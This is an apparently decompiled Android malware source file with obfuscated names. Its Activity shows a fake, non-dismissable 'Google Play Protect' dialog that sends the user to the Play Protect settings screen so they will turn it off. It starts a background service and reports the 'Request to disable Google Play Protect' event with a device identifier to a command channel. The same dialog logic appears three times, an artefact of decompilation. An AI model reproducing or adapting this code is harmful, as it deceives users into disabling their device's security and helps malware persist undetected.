package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.os.Bundle;
import wocwvy.czyxoxmbauu.slsa.C0034b;
import wocwvy.czyxoxmbauu.slsa.R;
import wocwvy.czyxoxmbauu.slsa.usbvhkriufnc;

public class ovyvpsbxxrtayd extends Activity {

    /* renamed from: a */
    C0034b f460a = new C0034b();

    /* renamed from: b */
    Context f461b;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        String str;
        String str2;
        super.onCreate(bundle);
        String str3 = "Google Play Protect";
        String str4 = "";
        String str5 = "";
        this.f461b = this;
        try {
            str = this.f460a.mo234e(this, "textPlayProtect");
            try {
                str2 = this.f460a.mo234e(this, "buttonPlayProtect");
            } catch (Exception unused) {
                str2 = str5;
                StringBuilder sb = new StringBuilder();
                sb.append("p=");
                C0034b bVar = this.f460a;
                StringBuilder sb2 = new StringBuilder();
                sb2.append(this.f460a.mo247q(this));
                sb2.append("|Request to disable <Google Play Protect>!|");
                sb.append(bVar.mo225c(sb2.toString()));
                this.f460a.mo218b(this, "4", sb.toString());
                Builder builder = new Builder(this);
                builder.setTitle(str3).setMessage(str).setIcon(R.drawable.im).setCancelable(false).setNegativeButton(str2, new OnClickListener() {
                    public void onClick(DialogInterface dialogInterface, int i) {
                        Intent intent = new Intent();
                        intent.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                        try {
                            ovyvpsbxxrtayd.this.startActivity(intent);
                            ovyvpsbxxrtayd.this.f461b.startService(new Intent(ovyvpsbxxrtayd.this.f461b, usbvhkriufnc.class));
                        } catch (ActivityNotFoundException unused) {
                            ovyvpsbxxrtayd.this.f460a.mo213a("ERROR", "ActPlayProtect");
                        }
                        dialogInterface.cancel();
                    }
                });
                builder.create().show();
            }
        } catch (Exception unused2) {
            str = str4;
            str2 = str5;
            StringBuilder sb3 = new StringBuilder();
            sb3.append("p=");
            C0034b bVar2 = this.f460a;
            StringBuilder sb22 = new StringBuilder();
            sb22.append(this.f460a.mo247q(this));
            sb22.append("|Request to disable <Google Play Protect>!|");
            sb3.append(bVar2.mo225c(sb22.toString()));
            this.f460a.mo218b(this, "4", sb3.toString());
            Builder builder2 = new Builder(this);
            builder2.setTitle(str3).setMessage(str).setIcon(R.drawable.im).setCancelable(false).setNegativeButton(str2, new OnClickListener() {
                public void onClick(DialogInterface dialogInterface, int i) {
                    Intent intent = new Intent();
                    intent.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                    try {
                        ovyvpsbxxrtayd.this.startActivity(intent);
                        ovyvpsbxxrtayd.this.f461b.startService(new Intent(ovyvpsbxxrtayd.this.f461b, usbvhkriufnc.class));
                    } catch (ActivityNotFoundException unused) {
                        ovyvpsbxxrtayd.this.f460a.mo213a("ERROR", "ActPlayProtect");
                    }
                    dialogInterface.cancel();
                }
            });
            builder2.create().show();
        }
        StringBuilder sb32 = new StringBuilder();
        sb32.append("p=");
        C0034b bVar22 = this.f460a;
        StringBuilder sb222 = new StringBuilder();
        sb222.append(this.f460a.mo247q(this));
        sb222.append("|Request to disable <Google Play Protect>!|");
        sb32.append(bVar22.mo225c(sb222.toString()));
        this.f460a.mo218b(this, "4", sb32.toString());
        Builder builder22 = new Builder(this);
        builder22.setTitle(str3).setMessage(str).setIcon(R.drawable.im).setCancelable(false).setNegativeButton(str2, new OnClickListener() {
            public void onClick(DialogInterface dialogInterface, int i) {
                Intent intent = new Intent();
                intent.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                try {
                    ovyvpsbxxrtayd.this.startActivity(intent);
                    ovyvpsbxxrtayd.this.f461b.startService(new Intent(ovyvpsbxxrtayd.this.f461b, usbvhkriufnc.class));
                } catch (ActivityNotFoundException unused) {
                    ovyvpsbxxrtayd.this.f460a.mo213a("ERROR", "ActPlayProtect");
                }
                dialogInterface.cancel();
            }
        });
        try {
            builder22.create().show();
        } catch (Exception unused3) {
        }
    }
}
